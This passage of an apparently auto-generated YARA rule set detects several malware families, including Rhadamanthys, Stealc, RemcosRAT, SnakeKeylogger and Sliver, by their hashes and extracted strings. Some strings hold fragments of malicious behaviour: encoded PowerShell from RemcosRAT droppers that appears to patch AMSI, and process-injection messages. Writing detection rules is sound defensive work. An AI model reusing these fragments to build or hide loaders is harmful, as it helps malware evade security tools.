      $s8 = "Rem Postganges128! gaincome ansttelsesperioders13 interspersions tait?" fullword ascii /* score: '12.00'*/
      $s9 = "Rem laudanidine antetemple; bigotteriets" fullword ascii /* score: '11.00'*/
      $s10 = "Rem Sesambollens, templize reconquest131, menziesia16" fullword ascii /* score: '11.00'*/
      $s11 = "Rem Embeggar potchermen; tempesting161?" fullword ascii /* score: '11.00'*/
      $s12 = "Rem scriptoria vesicularity ministerprsidenten:" fullword ascii /* score: '10.00'*/
      $s13 = "Const Forfladigende = \"bistandsorganisation. perisomatic:\"" fullword ascii /* score: '10.00'*/
      $s14 = "Const Indifferente = \"Loggia? palatable143\"" fullword ascii /* score: '9.00'*/
      $s15 = "Rem Pavonazzetto. fodballen: fgtemaskes; operationsstuers" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x7546 and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _Rhadamanthys_signature__4035d2883e01d64f3e7a9dccb1d63af5_imphash__Rhadamanthys_signature__c7269d59926fa4252270f407e4dab043__26 {
   meta:
      description = "_subset_batch - from files Rhadamanthys(signature)_4035d2883e01d64f3e7a9dccb1d63af5(imphash).exe, Rhadamanthys(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ae90bed12d49863359497bf1854c46626c5c524f1bd6883a2711505c849b99e7"
      hash2 = "87eaae419cc95139893a6279261a43a2228aef451104a86ad06b42d670da1a63"
   strings:
      $x1 = "C:\\Windows\\System32\\cmd.exeCertEnumCertificatesInStoreEaster Island Standard TimeG waiting list is corruptedaddress not a sta" ascii /* score: '46.00'*/
      $x2 = "GetAddrInfoWGetConsoleCPGetLastErrorGetLengthSidGetStdHandleGetTempPathWLoadLibraryWReadConsoleWResumeThreadRevertToSelfSetEndOf" ascii /* score: '44.00'*/
      $x3 = "C:\\Windows\\System32\\cmd.exeCertEnumCertificatesInStoreEaster Island Standard TimeG waiting list is corruptedaddress not a sta" ascii /* score: '35.00'*/
      $x4 = "bad flushGen bad map statedalTLDpSugct?exchange fullfatal error: gethostbynamegetservbynamekernel32.dll" fullword ascii /* score: '33.00'*/
      $s5 = "CreateDirectoryWDnsNameCompare_WDuplicateTokenExFlushFileBuffersGC scavenge waitGC worker (idle)GODEBUG: value \"GetComputerName" ascii /* score: '30.00'*/
      $s6 = "= flushGen  gfreecnt= pages at  runqsize= runqueue= s.base()= spinning= stopwait= sweepgen  sweepgen= targetpc= throwing= until " ascii /* score: '28.00'*/
      $s7 = "mstartbad sequence numberbad value for fielddevice not a streamdirectory not emptydisk quota exceededdodeltimer: wrong Pfile alr" ascii /* score: '27.00'*/
      $s8 = ",M3.2.0,M11.1.0CreateHardLinkWDeviceIoControlDuplicateHandleFailed to find Failed to load FlushViewOfFileGetAdaptersInfoGetComma" ascii /* score: '24.00'*/
      $s9 = "cialnetapi32.dllnot pollableraceFiniLockreleasep: m=runtime: gp=runtime: sp=self-preemptshort bufferspanSetSpinesweepWaiterstrac" ascii /* score: '24.00'*/
      $s10 = "4 failedchan receivedumping heapend tracegc" fullword ascii /* score: '24.00'*/
      $s11 = "garbage collection scangcDrain phase incorrectindex out of range [%x]interrupted system callinvalid m->lockedInt = left over mar" ascii /* score: '24.00'*/
      $s12 = "RemoveDirectoryWSetFilePointerExSetThreadContextTerminateProcess\" /t REG_SZ /d \"" fullword ascii /* score: '23.00'*/
      $s13 = "GOMAXPROCSGetIfEntryGetVersionLockFileExWSACleanupWSASocketWWSAStartupatomicand8complex128debug calldnsapi.dllexitThreadfloat32n" ascii /* score: '23.00'*/
      $s14 = "OpenThreadTokenProcess32FirstWRegCreateKeyExWRegDeleteValueWUnmapViewOfFile]" fullword ascii /* score: '23.00'*/
      $s15 = "GOMAXPROCSGetIfEntryGetVersionLockFileExWSACleanupWSASocketWWSAStartupatomicand8complex128debug calldnsapi.dllexitThreadfloat32n" ascii /* score: '23.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 30000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _To_see_signature__1e0d39391eece9a53254f9143387743a_imphash__To_see_signature__8054ed4a00e159280213636aa14f505f_imphash__27 {
   meta:
      description = "_subset_batch - from files To-see(signature)_1e0d39391eece9a53254f9143387743a(imphash).dll, To-see(signature)_8054ed4a00e159280213636aa14f505f(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "44b6e17af2daabec4c36e6f0233452513e7916d6d7a7991b31e5c4122b7a5735"
      hash2 = "4428e25d655739ede32e83a5722469517f4e7c6bbda62b74cd5373c91e027a6c"
   strings:
      $x1 = "                 `DW_CHILDREN_{yes,no}`The specified length is impossibleFound an unknown `DW_FORM_*` typeExpected a zero, found" ascii /* score: '41.00'*/
      $x2 = "DW_AT_nullDW_AT_siblingDW_AT_locationDW_AT_nameDW_AT_orderingDW_AT_byte_sizeDW_AT_bit_offsetDW_AT_bit_sizeDW_AT_stmt_listDW_AT_l" ascii /* score: '39.00'*/
      $s3 = "PATHPowerShell.exe" fullword ascii /* score: '27.00'*/
      $s4 = "PermissionsNotFoundPermissionDeniedConnectionRefusedConnectionResetHostUnreachableNetworkUnreachableConnectionAbortedNotConnecte" ascii /* score: '27.00'*/
      $s5 = "out of range integral type conversion attemptedcannot parse integer from empty stringinvalid digit found in stringnumber too lar" ascii /* score: '25.00'*/
      $s6 = "getrandom: this target is not supportederrno: did not return a positive valueunexpected situationSecRandomCopyBytes: iOS Securit" ascii /* score: '24.00'*/
      $s7 = "DW_TAG_nullDW_TAG_array_typeDW_TAG_class_typeDW_TAG_entry_pointDW_TAG_enumeration_typeDW_TAG_formal_parameterDW_TAG_imported_dec" ascii /* score: '24.00'*/
      $s8 = "ge to fit in target typenumber too small to fit in target typenumber would be zero for non-zero typeargument of integer logarith" ascii /* score: '19.00'*/
      $s9 = " to be variable-length encoded, which makes binary search impossible.The `DW_UT_*` value for this unit is not supported yetRange" ascii /* score: '18.00'*/
      $s10 = "ExitStatusfatal runtime error: I/O error: operation failed to complete synchronously, aborting" fullword ascii /* score: '18.00'*/
      $s11 = "Invalid PE import descriptor nameInvalid PE import thunk addressMissing PE import thunk hintMissing PE import thunk nameMissing " ascii /* score: '18.00'*/
      $s12 = "assertion failed: n <= self.buf.init - self.buf.filled" fullword ascii /* score: '18.00'*/
      $s13 = "dAddrInUseAddrNotAvailableNetworkDownBrokenPipeAlreadyExistsNotADirectoryIsADirectoryDirectoryNotEmptyReadOnlyFilesystemFilesyst" ascii /* score: '17.00'*/
      $s14 = "targetAddress()" fullword ascii /* score: '17.00'*/
      $s15 = "er, but found a CIE pointer instead.Invalid branch target in DWARF expressionDW_OP_push_object_address used but no object addres" ascii /* score: '17.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 8000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _Stealc_signature__c7269d59926fa4252270f407e4dab043_imphash__Stealc_signature__c7269d59926fa4252270f407e4dab043_imphash__837_28 {
   meta:
      description = "_subset_batch - from files Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash).exe, Stealc(signature)_c7269d59926fa4252270f407e4dab043(imphash)_837a5ae1.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "31294603a887756a97d1f8b3b5f8a0f3ece03907448ea717dfc8b4d017be5897"
      hash2 = "837a5ae11a55ee51f20f6e1377a714730fe4df1914d22529064a70008393dca8"
   strings:
      $x1 = "slice bounds out of range [:%x] with length %ystopTheWorld: not stopped (status != _Pgcstop)sysGrow bounds not aligned to palloc" ascii /* score: '50.00'*/
      $x2 = ".lib section in a.out corruptedbad write barrier buffer boundscannot assign requested addresscasgstatus: bad incoming valueschec" ascii /* score: '46.50'*/
      $x3 = "GetAddrInfoWGetLastErrorGetLengthSidGetStdHandleGetTempPathWLoadLibraryWReadConsoleWResumeThreadSetEndOfFileTransmitFileVirtualA" ascii /* score: '44.00'*/
      $x4 = "unknown pcws2_32.dll  of size   (targetpc= KiB work,  freeindex= gcwaiting= idleprocs= in status  mallocing= ms clock,  nBSSRoot" ascii /* score: '43.00'*/
      $x5 = "RtlGetNtVersionNumbersaddress already in useadvapi32.dll not foundargument list too longassembly checks failedbad g->status in r" ascii /* score: '42.00'*/
      $x6 = "WriteProcessMemorybad manualFreeListconnection refusedfaketimeState.lockfile name too longforEachP: not donegarbage collectionid" ascii /* score: '42.00'*/
      $x7 = "mismatched count during itab table copymspan.sweep: bad span state after sweepout of memory allocating heap arena mapruntime: ca" ascii /* score: '41.00'*/
      $x8 = "file descriptor in bad statefindrunnable: netpoll with pfound pointer to free objectgcBgMarkWorker: mode not setgcstopm: negativ" ascii /* score: '38.00'*/
      $x9 = "WSAEnumProtocolsWbad TinySizeClassdebugPtrmask.lockentersyscallblockexec format errorg already scannedglobalAlloc.mutexlocked m0" ascii /* score: '38.00'*/
      $x10 = " to unallocated spanCertOpenSystemStoreWCreateProcessAsUserWCryptAcquireContextWGetAcceptExSockaddrsGetCurrentDirectoryWGetFileA" ascii /* score: '37.00'*/
      $x11 = "Go pointer stored into non-Go memoryUnable to determine system directoryaccessing a corrupted shared libraryruntime: VirtualQuer" ascii /* score: '36.00'*/
      $x12 = "bad flushGen bad map stateexchange fullfatal error: gethostbynamegetservbynamekernel32.dll" fullword ascii /* score: '33.00'*/
      $x13 = "entersyscallgcBitsArenasgcpacertracehost is downillegal seekinvalid slotiphlpapi.dllkernel32.dllmadvdontneedmheapSpecialmspanSpe" ascii /* score: '32.00'*/
      $s14 = "ddetailsecur32.dllshell32.dlltracealloc(unreachableuserenv.dll KiB total,  [recovered] allocCount  found at *( gcscandone  heapM" ascii /* score: '30.00'*/
      $s15 = "llocabi mismatchadvapi32.dllbad flushGenbad g statusbad g0 stackbad recoverycan't happencas64 failedchan receivedumping heapend " ascii /* score: '29.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and pe.imphash() == "c7269d59926fa4252270f407e4dab043" and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f8676c0eabd52438a3e9d250ae4ce9d9_imphash__SnakeKeylogger_signature__636312a5ec1f8b9f790598a6e097c5a4_i_29 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash)_082c1741.exe, SnakeKeylogger(signature)_995cce3d6fb20b2d8af502c8788f55d7(imphash).exe, SnakeKeylogger(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b1b35d08454aa76254214c2fb611bab5b7de66751c502203ee16690b9c754936"
      hash2 = "cbc7b8123f7ef72341952e2e1acb4b8debdb0e3df2ecfcce92eedf95e208e63d"
      hash3 = "082c17414af12072323ba9f4c1b1ce57491434032ff5f339374866dea3dfcc09"
      hash4 = "faa45b0c9550932a04ceb9a608e53f3688215a757eab77c264d135a149466984"
      hash5 = "25a0cac54fdaeec8e52d8c5689f775fb00c6af4e6c07935ad967fd4a6c09971b"
   strings:
      $x1 = ":System.Private.TypeLoader.dll$System.Private.Uri" fullword ascii /* score: '31.00'*/
      $s2 = "System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089$RelativeOrAbsolute" fullword ascii /* score: '24.00'*/
      $s3 = "The System.Text.Json library is built-in as part of the shared framework in .NET Runtime. The package can be installed when you " ascii /* score: '19.00'*/
      $s4 = "need to use it in other target frameworks." fullword ascii /* score: '17.00'*/
      $s5 = "2GetUriPartsFromUserString<GetLengthWithoutTrailingSpaces" fullword ascii /* score: '17.00'*/
      $s6 = "System.Collections.Generic.IEnumerable<System.Text.RegularExpressions.Symbolic.SymbolicRegexNode<TSet>>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s7 = "System.Collections.Generic.IEnumerator<System.Text.RegularExpressions.Symbolic.SymbolicRegexNode<TSet>>.get_Current" fullword ascii /* score: '15.00'*/
      $s8 = " GetTargetCulture" fullword ascii /* score: '14.00'*/
      $s9 = ",GetHostViaCustomSyntax" fullword ascii /* score: '14.00'*/
      $s10 = "Invalid URI: A Dos path must be rooted, for example, 'c:\\\\'" fullword wide /* score: '13.00'*/
      $s11 = "4InitializeCommandLineArgsW" fullword ascii /* score: '12.00'*/
      $s12 = "4DecrementRunningForeground0WaitForForegroundThreads6GetOSHandleForCurrentThread" fullword ascii /* score: '12.00'*/
      $s13 = " ThreadEntryPoint\"GetApartmentState@" fullword ascii /* score: '12.00'*/
      $s14 = "Invalid URI: The Authority/Host could not be parsed" fullword wide /* score: '12.00'*/
      $s15 = "This operation is not supported for a relative URI" fullword wide /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 23000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _SnakeKeylogger_signature__SnakeKeylogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__SnakeKeylogger_signature__f34_30 {
   meta:
      description = "_subset_batch - from files SnakeKeylogger(signature).exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5487558b.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a29e9b8e.exe, SnakeKeylogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_b43a26bb.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "35e0daa6826570cbb6799a2f585f50e057377998c1c37750636678f70b256122"
      hash2 = "eb93a2c587001ccf2607575c3639b8229d112347d870dfdeec97876f7e0ad8e1"
      hash3 = "5487558b2691eda44b1e4476a8597588f290f6686d200ac9a8e8692d186432a4"
      hash4 = "a29e9b8e67c16a0c46bed63e400297cb520b0084d1a2cccd76fcc4201caae734"
      hash5 = "b43a26bba9392c41659ef71c0ba10b4c00d641646c002a64cbe11d09fc4f5cd9"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPAD4T" fullword ascii /* score: '27.00'*/
      $s2 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPAD*G" fullword ascii /* score: '27.00'*/
      $s3 = "iamgeB.ErrorImage" fullword wide /* score: '10.00'*/
      $s4 = "iamgeA.ErrorImage" fullword wide /* score: '10.00'*/
      $s5 = "getHeigh" fullword ascii /* score: '9.00'*/
      $s6 = "getWeight" fullword ascii /* score: '9.00'*/
      $s7 = "labelComp2" fullword wide /* score: '8.00'*/
      $s8 = "labelComp5" fullword wide /* score: '8.00'*/
      $s9 = "labelComp1" fullword wide /* score: '8.00'*/
      $s10 = "labelComp4" fullword wide /* score: '8.00'*/
      $s11 = "labelComp3" fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__7d55bce71f04e2295549851ae8e8438c_imphash__Rhadamanthys_signature__198098fa616880c50e48e8c22b284156_imp_31 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_7d55bce71f04e2295549851ae8e8438c(imphash).exe, Rhadamanthys(signature)_198098fa616880c50e48e8c22b284156(imphash).exe, Rhadamanthys(signature)_7bfcbc53d4c02bdedbc3a63219e5ed9f(imphash).exe, Rhadamanthys(signature)_d5834be2544a02797750dc7759c325d4(imphash).exe, SnakeKeylogger(signature)_995cce3d6fb20b2d8af502c8788f55d7(imphash).exe, SnakeKeylogger(signature)_e1286f2989f2b70b354fe5e33036a7bb(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4b052c0a60681008a7ebd4b9797badf24129a8710c0ec56fe560c14c61c44f79"
      hash2 = "faff87c6bdf6c63216c2507eee89ae434cce7da8a940373e0ace694798b976c7"
      hash3 = "a5e075e870c492583a67a818932e5c48d879db6d343ac6c837306222e444b8d7"
      hash4 = "a18e90d3f747ff22bdd705536ec38718b3611ae4ecd74fee73509faf5b708ec7"
      hash5 = "faa45b0c9550932a04ceb9a608e53f3688215a757eab77c264d135a149466984"
      hash6 = "e1eb24ee7b92716ab4ca09309e4dc4ce5470f832145d00f18a2eda2dcd595384"
   strings:
      $s1 = "System.Collections.Generic.IEnumerator<System.Runtime.Loader.LibraryNameVariation>.get_Current@" fullword ascii /* score: '24.00'*/
      $s2 = "nicu.dll" fullword wide /* score: '23.00'*/
      $s3 = "System.Runtime.CompilerService" fullword wide /* score: '20.00'*/
      $s4 = "2GetRuntimeTypeBypassCache" fullword ascii /* score: '19.00'*/
      $s5 = ".set_DynamicTemplateType0set_DynamicGcStaticsData6set_DynamicNonGcStaticsData:set_DynamicThreadStaticsIndex0get_PointerToTypeMan" ascii /* score: '19.00'*/
      $s6 = ".set_DynamicTemplateType0set_DynamicGcStaticsData6set_DynamicNonGcStaticsData:set_DynamicThreadStaticsIndex0get_PointerToTypeMan" ascii /* score: '19.00'*/
      $s7 = "<TryGetPointerTypeForTargetType0GetPointerTypeTargetTypeLTryGetFunctionPointerTypeForComponents@" fullword ascii /* score: '17.00'*/
      $s8 = "PTryGetArrayTypeForElementType_LookupOnlyRTryGetPointerTypeForTargetType_LookupOnlyNTryGetByRefTypeForTargetType_LookupOnly(GetC" ascii /* score: '17.00'*/
      $s9 = "DReflectionExecutionDomainCallbacks&TypeLoaderCallbacks6StackTraceMetadataCallbacks$FunctionPointerOps[" fullword ascii /* score: '16.00'*/
      $s10 = "PTryGetArrayTypeForElementType_LookupOnlyRTryGetPointerTypeForTargetType_LookupOnlyNTryGetByRefTypeForTargetType_LookupOnly(GetC" ascii /* score: '16.00'*/
      $s11 = "ExecutionDomain(ExecutionEnvironment" fullword ascii /* score: '16.00'*/
      $s12 = "[!] Invalid thread handle or payload bas" fullword wide /* score: '16.00'*/
      $s13 = "System.Collections.Generic.IEnumerator<Internal.Reflection.Core.QScopeDefinition>.get_Current@" fullword ascii /* score: '15.00'*/
      $s14 = "System.Collections.Generic.IEnumerator<Internal.Metadata.NativeFormat.NamespaceDefinitionHandle>.get_Current@" fullword ascii /* score: '15.00'*/
      $s15 = "[!] Failed to get thread context for PE" fullword wide /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 20000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f8676c0eabd52438a3e9d250ae4ce9d9_imphash__Rhadamanthys_signature__acb97f311176c6761732879ff5096c34_imp_32 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, Rhadamanthys(signature)_acb97f311176c6761732879ff5096c34(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash).exe, SnakeKeylogger(signature)_636312a5ec1f8b9f790598a6e097c5a4(imphash)_082c1741.exe, SnakeKeylogger(signature)_d9d3dc366861974d56e9cfc24758d032(imphash).exe, SnakeKeylogger(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b1b35d08454aa76254214c2fb611bab5b7de66751c502203ee16690b9c754936"
      hash2 = "cac7b5e6cdd5bf4fdcd9017dd1e23837cfb4b67a9568a70bb6a6525a0f313438"
      hash3 = "cbc7b8123f7ef72341952e2e1acb4b8debdb0e3df2ecfcce92eedf95e208e63d"
      hash4 = "082c17414af12072323ba9f4c1b1ce57491434032ff5f339374866dea3dfcc09"
      hash5 = "2f4b19d08da3f9a16b75ff1211c2aecd6e2b4f372f832b8fc6499cb1ea6384f3"
      hash6 = "25a0cac54fdaeec8e52d8c5689f775fb00c6af4e6c07935ad967fd4a6c09971b"
   strings:
      $s1 = "System.ComponentModel.Design.IDesignerHost.IsSupported" fullword ascii /* score: '25.00'*/
      $s2 = "Description: The process was terminated due to an internal error in the .NET Runtime" fullword wide /* score: '24.00'*/
      $s3 = "System.ComponentModel.TypeDescriptor.IsComObjectDescriptorSupported" fullword ascii /* score: '23.00'*/
      $s4 = "System.ComponentModel.DefaultValueAttribute.IsSupported" fullword ascii /* score: '20.00'*/
      $s5 = "icu.dll" fullword wide /* score: '20.00'*/
      $s6 = "Description: The process was terminated due to an unhandled exception" fullword wide /* score: '18.00'*/
      $s7 = "PTryGetArrayTypeForElementType_LookupOnly<TryGetPointerTypeForTargetTypeRTryGetPointerTypeForTargetType_LookupOnly8TryGetByRefTy" ascii /* score: '17.00'*/
      $s8 = "RtlGetReturnAddressHijackTarget" fullword ascii /* score: '17.00'*/
      $s9 = "System.GC.DTargetTCP" fullword ascii /* score: '17.00'*/
      $s10 = "Description: The application requested process termination through System.Environment.FailFast" fullword wide /* score: '17.00'*/
      $s11 = "peForTargetTypeNTryGetByRefTypeForTargetType_LookupOnly(GetCanonicalHashCode@" fullword ascii /* score: '16.00'*/
      $s12 = "PTryGetArrayTypeForElementType_LookupOnly<TryGetPointerTypeForTargetTypeRTryGetPointerTypeForTargetType_LookupOnly8TryGetByRefTy" ascii /* score: '16.00'*/
      $s13 = "Concurrent operations from multiple threads on this type are not supported" fullword wide /* score: '15.00'*/
      $s14 = "The collection's comparer does not support the requested operation" fullword wide /* score: '15.00'*/
      $s15 = "GCDTargetTCP" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 23000KB and ( 8 of them )
      ) or ( all of them )
}

rule _Sliver_signature__c2d457ad8ac36fc9f18d45bffcd450c2_imphash__SparkRAT_signature__9cbefe68f395e67356e2a5d8d1b285c0_imphash__S_33 {
   meta:
      description = "_subset_batch - from files Sliver(signature)_c2d457ad8ac36fc9f18d45bffcd450c2(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, SparkRAT(signature)_9cbefe68f395e67356e2a5d8d1b285c0(imphash)_d75aad03.exe, ValleyRAT(signature)_d42595b695fc008ef2c56aabd8efd68e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d15e35dcb836d038d70b217709261b6a29c1d871c16304368b18ece21b989878"
      hash2 = "ed370fcbafa43b4b578d5722e922e706dd854189e5a5b9ca17213c307b3f9a23"
      hash3 = "d75aad0391ff8c63fba6f7315e520f5ea61229591277b09240e48e185e435eea"
      hash4 = "faed38b89c09070971844291bfefe437592451789e389ab38e3396ff84e49159"
   strings:
      $s1 = "*windows.DLL" fullword ascii /* score: '20.00'*/
      $s2 = "golang.org/x/sys/windows.getSystemDirectory" fullword ascii /* score: '18.00'*/
      $s3 = "golang.org/x/sys/windows.(*DLLError).Unwrap" fullword ascii /* score: '18.00'*/
      $s4 = "golang.org/x/sys/windows.(*DLLError).Error" fullword ascii /* score: '18.00'*/
      $s5 = "golang.org/x/sys/windows.GetSystemDirectory" fullword ascii /* score: '18.00'*/
      $s6 = "*windows.DLLError" fullword ascii /* score: '16.00'*/
      $s7 = "golang.org/x/sys/windows.(*DLL).FindProc" fullword ascii /* score: '15.00'*/
      $s8 = "golang.org/x/sys/windows.(*LazyDLL).Load" fullword ascii /* score: '15.00'*/
      $s9 = "golang.org/x/sys/windows.LoadDLL" fullword ascii /* score: '15.00'*/
      $s10 = "golang.org/x/sys/windows.getStdHandle" fullword ascii /* score: '15.00'*/
      $s11 = "runtime.gcPaceSweeper" fullword ascii /* score: '15.00'*/
      $s12 = "golang.org/x/sys/windows.(*LazyDLL).NewProc" fullword ascii /* score: '15.00'*/
      $s13 = "runtime.(*activeSweep).end" fullword ascii /* score: '15.00'*/
      $s14 = "golang.org/x/sys/windows.GetStdHandle" fullword ascii /* score: '15.00'*/
      $s15 = "strconv.computeBounds" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 25000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__f8676c0eabd52438a3e9d250ae4ce9d9_imphash__SnakeKeylogger_signature__995cce3d6fb20b2d8af502c8788f55d7_i_34 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe, SnakeKeylogger(signature)_995cce3d6fb20b2d8af502c8788f55d7(imphash).exe, SnakeKeylogger(signature)_f8676c0eabd52438a3e9d250ae4ce9d9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b1b35d08454aa76254214c2fb611bab5b7de66751c502203ee16690b9c754936"
      hash2 = "faa45b0c9550932a04ceb9a608e53f3688215a757eab77c264d135a149466984"
      hash3 = "25a0cac54fdaeec8e52d8c5689f775fb00c6af4e6c07935ad967fd4a6c09971b"
   strings:
      $s1 = "DSystem.Text.RegularExpressions.dll" fullword ascii /* score: '26.00'*/
      $s2 = "<EnsureSufficientExecutionStackBTryEnsureSufficientExecutionStack.GetSufficientStackLimit" fullword ascii /* score: '21.00'*/
      $s3 = "HDateTimeOffsetTimeZonePostProcessing" fullword ascii /* score: '20.00'*/
      $s4 = "RehydrateTarget.EnsureComAwareReference" fullword ascii /* score: '20.00'*/
      $s5 = "GetDateOfNNDS*ProcessDateTimeSuffix" fullword ascii /* score: '20.00'*/
      $s6 = "System.Collections.Generic.IEnumerator<System.Collections.Generic.KeyValuePair<System.String,System.Text.RegularExpressions.Grou" ascii /* score: '18.00'*/
      $s7 = "System.Collections.Generic.IEnumerable<System.Collections.Generic.KeyValuePair<System.String,System.Text.RegularExpressions.Grou" ascii /* score: '18.00'*/
      $s8 = "System.Collections.Generic.IEnumerable<Internal.TypeSystem.FieldDesc>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s9 = "nSystem.Collections.Generic.ICollection<TValue>.ContainsxSystem.Collections.Generic.IEnumerable<TValue>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s10 = "DGetWrongValueTypeArgumentException.GetKeyNotFoundException" fullword ascii /* score: '15.00'*/
      $s11 = "4ProcessHebrewTerminalState" fullword ascii /* score: '15.00'*/
      $s12 = ".GetHashCodeOfStringCore\"IcuInitSortHandle2GetIsAsciiEqualityOrdinal IcuCompareString" fullword ascii /* score: '15.00'*/
      $s13 = "System.Collections.Generic.IEnumerable<System.Text.RegularExpressions.Group>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s14 = "(ProcessTerminalState" fullword ascii /* score: '15.00'*/
      $s15 = "System.Collections.Generic.IList<System.Text.RegularExpressions.Group>.get_Item" fullword ascii /* score: '15.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 23000KB and ( 8 of them )
      ) or ( all of them )
}

rule _RemcosRAT_signature__cc7b56a4_RemcosRAT_signature__d50825f4_35 {
   meta:
      description = "_subset_batch - from files RemcosRAT(signature)_cc7b56a4.bat, RemcosRAT(signature)_d50825f4.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "cc7b56a4bd2ce38278456412fe5b31cf7b742fd23e807b5109617631592fc9c5"
      hash2 = "d50825f42162126cafad375cfe5995b2a0b632a5238ed9b66d929613e2ec7020"
   strings:
      $s1 = "CgANwAxACwAMQAwADEALAAxADEANgAsADgAMAAsADEAMQA0ACwAMQAxADEALAA5ADkALAA2ADUALAAxADAAMAAsADEAMAAwACwAMQAxADQALAAxADAAMQAsADEAMQA1A" ascii /* score: '11.00'*/
      $s2 = "FMAeQBzAHQAZQBtAC4AUgB1AG4AdABpAG0AZQAuAEkAbgB0AGUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzAC4ATQBhAHIAcwBoAGEAbABdADoAOgBHAGUAdABEAGUAbABlA" ascii /* score: '11.00'*/
      $s3 = "FAAcgBvAHAAZQByAHQAeQAgAD0AIAAkAGEAdQB0AG8AbQBhAHQAaQBvAG4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAJwBhAG0AcwBpAFMAZQBzA" ascii /* score: '11.00'*/
      $s4 = "HMALAAgAFsAVAB5AHAAZQBbAF0AXQAkAEkAbgBwAHUAdABQAGEAcgBhAG0AZQB0AGUAcgBzACwAIABbAFQAeQBwAGUAXQAkAE8AdQB0AHAAdQB0AFQAeQBwAGUAIAA9A" ascii /* score: '11.00'*/
      $s5 = "HYAaQBkAGUAcgAgAD0AIAAkAG0AZQBtAG8AcgB5AE0AYQBuAGEAZwBlAHIAOgA6AFIAZQBhAGQASQBuAHQAMwAyACgAWwBJAG4AdABQAHQAcgBdACgAJABiAGEAcwBlA" ascii /* score: '11.00'*/
      $s6 = "D0AIAAkAG0AZQBtAG8AcgB5AE0AYQBuAGEAZwBlAHIAOgA6AFIAZQBhAGQASQBuAHQAMwAyACgAWwBJAG4AdABQAHQAcgBdACgAJAB2AHQAYQBiAGwAZQAgACsAIAAxA" ascii /* score: '11.00'*/
      $s7 = "F0AOgA6AEEAZABkACgAJABUAGEAcgBnAGUAdABBAGQAZAByAGUAcwBzACwAIAAkAG0AbwBkAGkAZgBpAGMAYQB0AGkAbwBuAEQAYQB0AGEALgBMAGUAbgBnAHQAaAAgA" ascii /* score: '11.00'*/
